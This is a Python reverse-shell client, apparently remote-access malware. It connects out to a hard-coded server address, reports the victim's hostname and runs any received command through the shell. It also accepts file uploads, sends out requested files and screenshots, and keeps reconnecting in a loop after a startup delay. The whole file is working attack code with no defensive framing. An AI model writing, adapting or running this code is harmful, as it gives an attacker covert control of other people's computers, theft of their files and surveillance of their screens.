import os
import socket
import subprocess
import time
import signal
import sys
import struct
import pyscreenshot as ImageGrab
 
class Client(object):
 
    def __init__(self):
        self.serverHost = '192.168.1.17'
        if not self.isIP(self.serverHost):
            self.serverHost = socket.gethostbyname(self.serverHost)
        self.serverPort = 9999
        self.socket = None
 
    def register_signal_handler(self):
        signal.signal(signal.SIGINT, self.quit_gracefully)
        signal.signal(signal.SIGTERM, self.quit_gracefully)
        return
 
    def quit_gracefully(self, signal=None, frame=None):
        print('\nQuitting gracefully')
        if self.socket:
            try:
                self.socket.shutdown(2)
                self.socket.close()
            except Exception as e:
                print('Could not close connection %s' % str(e))
                # continue
        sys.exit(0)
 
    def isIP(self,ip):
        try:
            socket.inet_aton(ip)
            return True
        except socket.error:
            return False
 
    def socket_create(self):
        """ Create a socket """
        try:
            self.socket = socket.socket()
        except socket.error as e:
            print("Socket creation error" + str(e))
            return
        return
 
    def socket_connect(self):
        """ Connect to a remote socket """
        try:
            print('Connecting to '+ self.serverHost + ':' + str(self.serverPort) +' ...')
            self.socket.connect((self.serverHost, self.serverPort))
        except socket.error as e:
            print("Socket connection error: " + str(e))
            time.sleep(5)
            raise
        try:
            self.socket.send(str.encode(socket.gethostname()))
        except socket.error as e:
            print("Cannot send hostname to server: " + str(e))
            raise
        return
 
    def print_output(self, output_str):
        """ Prints command output """
        sent_message = str.encode(output_str + str(os.getcwd()) + '> ')
        self.socket.send(struct.pack('>I', len(sent_message)) + sent_message)
        print(output_str)
        return
 
    def receive_commands(self):
        """ Receive commands from remote server and run on local machine """
        try:
            self.socket.recv(10)
        except Exception as e:
            print('Could not start communication with server: %s\n' %str(e))
            return
        cwd = str.encode(str(os.getcwd()) + '> ')
        self.socket.send(struct.pack('>I', len(cwd)) + cwd)
        while True:
            output_str = None
            data = self.socket.recv(20480)
            if data == b'': break
            elif data[:2].decode("utf-8") == 'cd':
                directory = data[3:].decode("utf-8")
                try:
                    os.chdir(directory.strip())
                except Exception as e:
                    output_str = "Could not change directory: %s\n" %str(e)
                else:
                    output_str = ""
            elif data[:].decode("utf-8") == 'quit':
                self.socket.close()
                break
            elif data[:6].decode("utf-8") == 'upload':
                self.receivefile(data[7:])
                output_str = "File received succesfully!"
            elif data[:8].decode("utf-8") == 'download':
                if self.sendfile(self.socket,data[9:]) :
                    self.socket.send(str.encode('FARIDEOF-1'))
            elif data[:].decode("utf-8") == 'shoot':
                print("preparing to shoot")
                self.shoot(self.socket)
            elif len(data) > 0:
                try:
                    cmd = subprocess.Popen(data[:].decode("utf-8"), shell=True, stdout=subprocess.PIPE,
                                           stderr=subprocess.PIPE, stdin=subprocess.PIPE)
                    output_bytes = cmd.stdout.read() + cmd.stderr.read()
                    output_str = output_bytes.decode("utf-8", errors="replace")
                except Exception as e:
                    # TODO: Error description is lost
                    output_str = "Command execution unsuccessful: %s\n" %str(e)
            if output_str is not None:
                try:
                    self.print_output(output_str)
                except Exception as e:
                    print('Cannot send command output: %s' %str(e))
        self.socket.close()
        return
 
    def receivefile(self, data):
        f = open(data,"wb")
        l = 1
        l = self.socket.recv(1024)
        while l:
            print(l)
            f.write(l)
            l = self.socket.recv(1024)
            if l == str.encode("FARIDEOF-1"):
                break
        f.close()
 
    def shoot(self,conn):
        im=ImageGrab.grab()
        print('image taken')
        im.save("img.jpg","JPEG")
        print('image saved')
        self.sendfile(conn,"img.jpg")
        print('image sent')
        self.socket.send(str.encode('FARIDEOF-1'))
        os.remove('img.jpg')
 
    def sendfile(self,conn,name):
        try:
            f = open(name,"rb")
            l = f.read(1024)
            while l:
                conn.send(l)
                l = f.read(1024)
            return True
        except:
            print("File not found!!")
            return False
 
 
def main():
    time.sleep(60)
    client = Client()
    client.register_signal_handler()
    client.socket_create()
    while True:
        try:
            client.socket_connect()
            print('Connected succesfully!!')
        except Exception as e:
            print("Error on socket connections: %s" %str(e))
            time.sleep(5)
            break
        else:
            break
    try:
        client.receive_commands()
    except Exception as e:
        print('Error in main: ' + str(e))
    client.socket.close()
    return
 
 
if __name__ == '__main__':
    while True:
        main()
        time.sleep(60)
